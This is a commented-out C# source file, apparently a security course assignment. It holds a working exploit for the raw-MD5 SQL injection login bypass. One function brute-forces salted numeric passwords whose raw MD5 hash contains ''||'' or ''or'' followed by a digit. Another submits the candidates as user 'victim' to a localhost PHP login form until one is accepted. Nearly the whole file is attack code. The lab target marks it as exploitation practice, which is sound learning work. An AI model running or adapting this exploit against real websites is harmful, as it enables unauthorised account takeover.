// using System.Security.Cryptography;
// using System.Text;
// using System.Text.RegularExpressions;
// using System.Xml;

// namespace Bungle
// {
//     public class SqlInjecting
//     {
//         If a PHP website imporerly uses MD5 hashing as way of securing and query pswds, this will find a viable pswd that can be
//         injected into that website.
//         public static void MD5HashingCrack()
//         {
//             Console.WriteLine("MD5 Hash Cracking BEGIN");

//             // Get all salts
//             List<string> salts = [];
//             string saltChars = "./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

//             for (int i = 0; i < saltChars.Length; i++)
//                 for (int j = 0; j < saltChars.Length; j++)
//                     salts.Add($"{saltChars[i]}{saltChars[j]}");

//             // Makes a thread for each possible salt, and goes through each possible pswd
//             // Will just use nums as the pswd. Type is ulong to ensure that we go from 0 - highest value possible
//             // Max # of threads set to all possible salt combinations, but can be decresed if PC a brick.
//             Parallel.ForEach(salts, new ParallelOptions { MaxDegreeOfParallelism = 676 }, salt =>
//             {
//                 for (ulong pswd = ulong.MinValue; pswd <= ulong.MaxValue; pswd++)
//                 {
//                     string pswdStr = pswd.ToString();
//                     string saltPswd = salt + pswdStr;
//                     byte[] md5Raw;
//                     md5Raw = MD5.HashData(Encoding.UTF8.GetBytes(saltPswd));

//                     string asciiApprox = Encoding.GetEncoding("ISO-8859-1").GetString(md5Raw);

//                     bool isPass = false;
//                     string[] patterns = ["'||'", "'or'"];

//                     // Checks for:
//                     // '||'
//                     // 'or'
//                     // and then a # (1-9) directly following it
//                     foreach (string pattern in patterns)
//                     {
//                         int patternIndex = asciiApprox.IndexOf(pattern, StringComparison.OrdinalIgnoreCase);

//                         if (patternIndex >= 0 && patternIndex + pattern.Length + 1 <= asciiApprox.Length)
//                         {
//                             string possibleCandidate = asciiApprox.Substring(patternIndex + pattern.Length, 1);

//                             if ("123456789".Contains(possibleCandidate))
//                                 isPass = true;
//                         }
//                     }

//                     // If u want the output to be in a text file, do the following:
//                     // Run the code in WSL with this command: nohup dotnet run > output.txt 2&>1 &
//                     // This will output the console onto a .txt file, while running it in background.
//                     if (isPass)
//                         Console.WriteLine($"POSSIBLE CANDIDATE:\n Salt+Pswd: {saltPswd}, Raw Hex: {BitConverter.ToString(md5Raw)}, ASCII: {asciiApprox}, Passed?: {isPass}\n");
//                 }
//             });

//             Console.WriteLine("END");
//         }

//         // Will inject all retrieved pswds from a .txt file into site, and see if login works.
//         // ASSUMES THE FOLLOWING:
//         // Site is http://localhost/project2/sqlinject2/, with that site's form and form names.
//         // pswds are directly after " Salt+Pswd: " in .txt file.
//         public async static Task InjectMaliciousPswdToWebsite(string pswdPath)
//         {
//             Console.WriteLine("Pswd injection BEGIN\n");

//             // Retrieves the pswds from the .txt file
//             StreamReader sr = new(pswdPath);
//             string? line = sr.ReadLine();
//             List<string> pswds = [];

//             while (!line.Equals("END"))
//             {
//                 Regex regx = new(@"Salt\+Pswd:\s*[a-zA-Z]{2}(\d+)");
//                 Match match = regx.Match(line);

//                 if (match.Success)
//                 {
//                     string candidate = match.Groups[1].Value.Trim();
//                     pswds.Add(candidate);
//                 }

//                 line = sr.ReadLine();
//             }

//             // Setting up the http connection
//             HttpClient httpClient = new();
//             string url = "http://localhost/project2/sqlinject2/checklogin.php";
//             bool isPswdFound = false;

//             // Injects each pswd into the site, seeing if the login is succesful
//             foreach (string candidate in pswds)
//             {
//                 try
//                 {
//                     Dictionary<string, string> formData = new()
//                     {
//                         {"username", "victim"},
//                         {"password", candidate},
//                         {"uid", "U51801771"}
//                     };
//                     FormUrlEncodedContent content = new(formData);
//                     string htmlBody;

//                     HttpResponseMessage response = await httpClient.PostAsync(url, content);
//                     htmlBody = await response.Content.ReadAsStringAsync();

//                     if (!htmlBody.Contains("Invalid") && !htmlBody.Contains("Incorrect") && !htmlBody.Contains("Error"))
//                     {
//                         Console.WriteLine($"SUCCESS on pswd {candidate}\nHTML Body:\n{htmlBody}");
//                         isPswdFound = true;
//                         return;
//                     }
//                     else
//                     {
//                         Console.WriteLine($"FAILURE on pswd {candidate}\nHTML Body: {htmlBody}\n");
//                     }
//                 }
//                 catch (Exception ex)
//                 {
//                     Console.WriteLine($"Some expection occured:\n{ex}\n");
//                 }
//             }

//             Console.WriteLine("FAILURE no pswd worked.");
//             Console.WriteLine("END");
//         }
//     }
// }